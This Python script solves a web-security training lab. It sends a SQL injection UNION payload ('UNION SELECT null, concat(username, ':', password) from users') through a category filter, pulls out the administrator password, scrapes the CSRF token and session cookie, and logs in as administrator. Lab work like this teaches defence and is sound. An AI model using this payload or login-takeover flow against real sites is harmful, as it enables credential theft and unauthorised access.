#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 21/9/2023
#
# Lab: SQL injection UNION attack, retrieving data from other tables
#
# Steps: 1. Inject payload into 'category' query parameter to retrieve administrator
#           password from users table using concatenation method
#        2. Fetch the login page
#        3. Extract the csrf token and session cookie
#        4. Login as the administrator
#        5. Fetch the administrator profilele
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0af200d703d705db817ffc2b00ac0009.web-security-academy.net"

print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")

# payload to retrieve the password of the administrator
payload = f"' UNION SELECT null, concat(username , ':', password) from users-- -"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")

except:
    print(Fore.RED + "[!] Failed to inject the payload to retrieve the password of the administrator through exception")
    exit(1)

# extract the administrator password
admin_password = re.findall("<th>administrator:(.*)</th>", injection.text)[0]

print(Fore.WHITE + "1. Retrieving administrator password from users table.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)

try:  
    # fetch the login page
    fetch_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1)

print(Fore.WHITE + "2. Fetching login page.. " + Fore.GREEN + "OK")

# get session cookie
session = fetch_login.cookies.get("session")

# Extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]

print(Fore.WHITE + "3. Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "username": "administrator",
    "password": admin_password,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:  
    # login in as the administrator
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)

except:
    print(Fore.RED + "[!] Failed to login as the administrator through exception")
    exit(1)

print(Fore.WHITE + "4. Logging in as the administrator.. " + Fore.GREEN + "OK")

# get session cookie
new_session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": new_session
}

try:  
    # fetch the administrator profile
    admin = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
    exit(1)

print(Fore.WHITE + "5. Fetching the administrator profile.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


